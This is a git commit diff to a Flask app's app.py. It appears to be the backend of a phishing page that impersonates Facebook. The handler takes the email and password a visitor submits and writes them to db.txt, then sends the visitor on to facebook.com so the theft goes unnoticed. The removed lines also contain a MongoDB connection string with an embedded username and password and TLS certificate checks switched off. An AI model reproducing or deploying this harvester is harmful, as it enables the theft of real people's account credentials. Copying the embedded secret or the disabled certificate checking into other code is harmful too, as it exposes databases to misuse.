c02664b1cdaef60469e6cc8036faf0204f2f33fa
ahsuy4334 <113499867+ahsuy4334@users.noreply.github.com>
2022-09-14 17:28:06 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,12 +1,10 @@
 from crypt import methods
 from flask import Flask, render_template, request, redirect, url_for
 from pymongo import MongoClient
+import os
 
 def create_app():
     app = Flask(__name__)
-    client = MongoClient("mongodb+srv://eddie:1250@hackseycluster.5ybokol.mongodb.net/test?ssl=true&ssl_cert_reqs=CERT_NONE")
-    app.db = client.hackseycluster
-    entrie = []
 
     @app.route('/', methods=["POST", "GET"])
     def home():
@@ -14,7 +12,12 @@ def create_app():
             Email = request.form.get("Email")
             Password = request.form.get("Password")
             data = {"email":Email, "password":Password}
-            app.db.entrie.insert_one(data)
+            
+            with open("db.txt", "w") as f:
+                f.write("Email: " + Email)
+                f.write("\n")
+                f.write("Password: "+ Password)
+            
 
             return redirect("https://www.facebook.com")
         return render_template('index.html')
